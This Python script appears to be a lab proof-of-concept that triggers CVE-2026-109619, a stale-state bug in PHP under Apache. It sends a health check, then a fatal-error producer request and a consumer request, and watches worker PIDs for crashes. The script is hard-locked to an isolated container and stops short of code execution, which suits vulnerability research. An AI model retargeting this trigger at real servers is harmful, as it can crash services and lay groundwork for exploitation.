#!/usr/bin/env python3
"""Local two-request trigger harness for CVE-2026-109619.

The producer deliberately raises a fatal error with fatal_error_backtraces
enabled. The next request applies an Apache per-directory PHP setting that
emits an early diagnostic before normal PHP request initialization. This is a
trigger harness only; it does not shape the heap or attempt code execution.
"""

from __future__ import annotations

import http.client
import sys
import time
from urllib.parse import urlsplit


def request(url: str, path: str):
    parsed = urlsplit(url)
    if parsed.scheme != "http" or parsed.hostname != "php2shell-stale-target":
        raise SystemExit("Only the isolated php2shell-stale-target container is allowed")
    conn = http.client.HTTPConnection(parsed.hostname, parsed.port or 80, timeout=8)
    conn.request("GET", path, headers={"Connection": "close"})
    response = conn.getresponse()
    result = (
        response.status,
        response.getheader("X-Lab-Worker-Pid"),
        response.read(4096).decode("latin1", "replace"),
    )
    conn.close()
    return result


def main() -> None:
    url = sys.argv[1] if len(sys.argv) > 1 else "http://php2shell-stale-target/"
    for attempt in range(20):
        try:
            status, pid, body = request(url, "/control/health.php")
            break
        except (OSError, TimeoutError):
            if attempt == 19:
                raise
            time.sleep(1)
    if "HEALTHY 8.5.4 apache2handler" not in body:
        raise SystemExit(f"Unexpected lab target: HTTP {status}, {body[:200]!r}")
    print(f"Baseline: HTTP {status}; worker PID={pid}; {body.strip()}")

    status, pid, body = request(url, "/producer/fatal.php")
    print(
        f"Producer request: HTTP {status}; worker PID={pid}; "
        f"fatal marker present={'LOCAL_CVE_109619_PRODUCER_FATAL' in body}"
    )

    try:
        status, pid, body = request(url, "/consumer/index.php")
        print(f"Consumer request: HTTP {status}; worker PID={pid}; {body[:240]!r}")
    except (OSError, TimeoutError, http.client.HTTPException) as exc:
        print(f"Consumer request disconnected: {type(exc).__name__}: {exc}")

    time.sleep(0.5)
    try:
        status, pid, body = request(url, "/control/health.php")
        print(f"Follow-up health: HTTP {status}; worker PID={pid}; {body.strip()}")
    except (OSError, TimeoutError, http.client.HTTPException) as exc:
        print(f"Follow-up health failed: {type(exc).__name__}: {exc}")
    print("Scope: stale-state producer/consumer trigger only; no RCE attempt.")


if __name__ == "__main__":
    main()
